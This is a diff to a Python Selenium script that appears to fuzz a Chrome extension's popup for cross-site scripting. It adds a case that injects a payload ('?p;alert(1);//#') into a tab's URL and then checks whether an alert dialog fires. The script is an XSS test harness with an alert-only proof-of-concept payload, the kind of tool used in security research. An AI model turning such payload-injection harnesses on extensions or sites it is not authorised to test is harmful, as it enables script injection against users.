@@ -250,11 +250,52 @@ def chromeTabsQuery(driver,abs_path, url_path, payloads, variable_to_change=1):
             except TimeoutException:
                 print('= No alerts detected =')
 
+    def chromeTabQuery_url():
+        # Case Secnario for chromeTabQuery_Title
+
+        # get www.example.com
+        driver.get('https://www.example.com')
+        # set handler for example.com
+        example = driver.current_window_handle
+
+        # get extension popup.html
+        driver.switch_to.new_window('tab')
+        extension = driver.current_window_handle
+        driver.get(url_path)
+
+
+        for payload in payloads:
+            payload = payload.strip()
+            
+            # change to example.com to change url property
+            driver.switch_to.window(example)
+            # driver.execute_script(f"location.href = 'https://www.example.com/?p{payload}'")
+            driver.execute_script("location.href = 'https://www.example.com/?p;alert(1);//#'")
+
+
+            # change to extension:
+            driver.switch_to.window(extension)
+            driver.refresh()
+
+            driver.execute_script("document.getElementById('entryPoint').value = '3';")
+            driver.execute_script("document.getElementById('submit').click();")
+
+            driver.switch_to.window(example)
+            try:
+                # wait 5 seconds to see if alert is detected
+                WebDriverWait(driver, 5).until(EC.alert_is_present())
+                alert = driver.switch_to.alert
+                alert.accept()
+                print('+ Alert Detected +')
+            except TimeoutException:
+                print('= No alerts detected =')
 
 
 
-
-    chromeTabQuery_title()
+    # case 1 title:
+    # chromeTabQuery_title()
+    # case 2 url:
+    # chromeTabQuery_url()
 
 
 
